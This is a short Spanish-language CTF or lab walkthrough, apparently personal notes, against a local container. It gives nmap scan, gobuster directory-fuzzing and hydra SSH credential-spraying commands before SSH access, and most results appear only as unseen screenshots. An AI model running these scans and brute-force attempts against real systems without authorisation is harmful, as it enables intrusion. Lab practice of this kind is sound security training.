tags: #fuzzing #hydra #sudo 
____
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.2
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Pasted image 20251022153018.png]]


Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,80 -vvv -oN version 172.17.0.2
```

![[Anexos/Pasted image 20251022150755.png]]

```bash
gobuster dir -u 172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -o dirs.txt
```

![[Pasted image 20251022150523.png]]


![[Pasted image 20251022150453.png]]

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2:5000 -I
```

![[Anexos/Pasted image 20251022152504.png]]

Accedemos por ssh:

![[Pasted image 20251022152742.png]]

![[Pasted image 20251022152816.png]]

![[Anexos/Pasted image 20251022152957.png]]


